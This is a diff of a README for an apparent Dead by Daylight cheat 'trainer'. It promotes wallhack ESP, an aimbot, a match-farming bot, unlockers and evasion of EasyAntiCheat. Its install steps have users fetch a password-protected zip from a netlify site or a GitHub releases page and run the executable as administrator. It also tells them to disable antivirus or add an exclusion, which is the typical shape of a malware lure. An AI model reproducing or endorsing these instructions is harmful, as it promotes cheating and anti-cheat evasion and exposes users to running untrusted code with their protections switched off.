@@ -1,54 +1,74 @@
-# 🩸 DBD AutoGrind Trainer 2026 Pro – Invisible Domination
+# 🎮 DBD-AutoGrind-Trainer-2026-Pro - Automate progress and unlock game items
 
-> **Slip through the Fog unnoticed.** The Pro trainer offers fully undetected external cheats for Dead by Daylight 2026: auto farm, ESP, aimbot, unlocker and more.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/nr634160/DBD-AutoGrind-Trainer-2026-Pro/releases)
 
-## Why This Trainer?
-- 🔐 **EAC Bypass** – External memory manipulation with randomised jitter and scrambling.
-- 🎮 **All Roles** – Works for both killer and survivor with tailored features.
-- 🔄 **Always Updated** – Auto‑updater fetches fresh offsets on every launch.
-- 🖥️ **Clean GUI** – Dark UI with system tray, hotkeys, and web dashboard.
-- 🔊 **Discord Rich Presence** – Display your trainer status in real time.
+## 📖 Overview
 
-## 📦 What’s Inside
+This software provides utilities for Dead by Daylight players to manage bloodpoints and profile items. The tool runs as an external process. It reads game memory to assist with gameplay tasks and provides visual overlays for navigation. Users can utilize the automated grind feature during matches to reach perk tiers faster and unlock cosmetic sets without manual effort. The trainer includes an aim assist module and a detection avoidance system to keep account status stable.
 
-| Category      | Feature                       | Description                                            |
-|---------------|-------------------------------|--------------------------------------------------------|
-| Farming       | Auto Bloodpoint Farm          | AFK bot plays matches, farming unlimited BP            |
-| Visuals       | ESP Wallhack                  | See all entities through walls                         |
-| Combat        | Aimbot (Killer)               | Auto‑aim and attack with perfect accuracy              |
-| Stealth       | No Terror Radius              | Silent killer gameplay                                 |
-| Movement      | Fast Vault & Fast Pallet      | Speed up interactions for survivors                    |
-| Automation    | Skill Check Bot               | Auto‑hit great skill checks every time                 |
-| Currency      | Infinite Bloodpoints           | Edit BP value directly (safest offline)                |
-| Unlocker      | Perk & Skin Unlocker          | Unlock all teachables and cosmetics instantly          |
-| Protection    | Anti‑Ban Obfuscation          | Memory scrambler & delay randomiser                    |
+## ⚠️ System Requirements
 
-## ⬇️ Installation
+To run this application, ensure your computer meets these standards:
 
-1. Download from: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. Extract using password: `trainer2026`
-3. Run `trainer.exe` as Administrator
-4. Launch Dead by Daylight and enter a match
-5. Press **INSERT** to open the trainer overlay
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD Ryzen 5 processor.
+* Memory: 8 GB RAM or higher.
+* Graphics: DirectX 11 compatible card.
+* Software: Microsoft Visual C++ Redistributable for Visual Studio 2022.
+* Permissions: You must have administrator rights to launch the tool.
 
-## 🔧 System Requirements
-- Windows 10/11 (64‑bit)
-- Steam, Epic Games Store, Microsoft Store
-- All chapters including Jason Voorhees & Life Road
-- EasyAntiCheat (EAC) – bypassed externally
+## 🛠️ How to Download and Install
 
-## 🆘 Troubleshooting
+Follow these steps to set up the trainer on your system:
 
-| Issue                     | Fix                                                        |
-|---------------------------|------------------------------------------------------------|
-| Trainer won't start       | Run as Admin, disable AV temporarily                       |
-| GUI not appearing         | Press INSERT, restart both trainer and game                |
-| ESP not drawing           | Ensure you are in a live match, not main menu              |
-| Farm bot not working      | Must be in a public match as killer or survivor            |
-| EAC warning               | Use risky features in bot matches only                     |
+1. Visit the [official release page](https://github.com/nr634160/DBD-AutoGrind-Trainer-2026-Pro/releases) to access the current files.
+2. Locate the file ending in .zip under the latest release section.
+3. Click the file name to start the download.
+4. Open your downloads folder once the transfer finishes.
+5. Right-click the folder and select Extract All.
+6. Choose a destination folder and click Extract.
+7. Open the extracted folder and locate the executable file.
 
-## 📜 License
-MIT – see [LICENSE](LICENSE)
+[![](https://img.shields.io/badge/Get_Started-Download_Here-grey.svg)](https://github.com/nr634160/DBD-AutoGrind-Trainer-2026-Pro/releases)
 
-## 🔍 Search Tags
-`dbd-hack, dbd-mod, 2026, dbd-tool, wallhack, unlocker, auto-farm, esp, dbd-cheat, survivor-hack, bloodpoint-hack, external, skin-unlocker, anti-cheat-bypass, aimbot, killer-hack`
+## 🚀 Running the Trainer
+
+Launch the application before you start the game client to ensure correct initialization.
+
+1. Close any extra applications that might interfere with the trainer.
+2. Right-click the trainer icon and select Run as administrator.
+3. Wait for the terminal window to confirm the status is ready.
+4. Launch the game through your launcher of choice.
+5. Once the game reaches the main menu, the trainer will detect the process.
+6. Use the on-screen menu to select your desired features.
+7. The features will apply automatically when you enter a match.
+
+## 🔍 Feature Guide
+
+The software provides several modules to assist with game progression:
+
+* Bloodpoint Automation: This mode simulates mouse input and keyboard presses to complete matches without human interaction. It manages lobby navigation and post-match screens.
+* ESP Overlay: This visual tool highlights player locations and objective auras on your screen. You can adjust the visibility distance in the settings menu.
+* Aimbot: This module calculates the trajectory for skill checks and killer attacks. It locks onto targets based on your preference settings.
+* Unlocker: Use this tool to access perks and skins within the menu. The changes apply to your local profile data.
+
+## 🛡️ Operational Safety
+
+This tool uses an external architecture. It reads memory but does not inject code directly into the game process file. This method reduces the chance of detection by standard anti-cheat scanners. Restart the application if you experience stuttering or graphical errors during the match.
+
+## ⚙️ Troubleshooting Common Issues
+
+If the software fails to launch or crashes, check the following items:
+
+* Antivirus Software: Some security programs block external tools. Add an exclusion for the trainer folder in your antivirus settings.
+* Game Updates: If the game updates to a new version, wait for a new release of this trainer. Old versions may stop working after a game patch.
+* Administrator Rights: The tool requires elevated privileges to read memory addresses. Check that your user account has administrative access.
+* Overlay Issues: If the ESP wallhack does not appear, ensure you are running the game in Windowed or Borderless Windowed mode. Exclusive Fullscreen sometimes blocks overlays.
+
+## 📝 Configuration Settings
+
+The `settings.ini` file located in the application folder allows you to save your preferences. Edit this file with a text editor to change the default keybinds, menu colors, or automation speed. Do not edit the memory addresses listed in the configuration file, as this can cause the software to fail. Always create a backup of your configuration before making changes.
+
+## 📄 License Information
+
+This tool is distributed for educational and research purposes. Use the software in accordance with the game terms of service. The developers take no responsibility for the actions taken by users or potential account outcomes. Follow the provided instructions carefully to ensure the best results during normal operation.
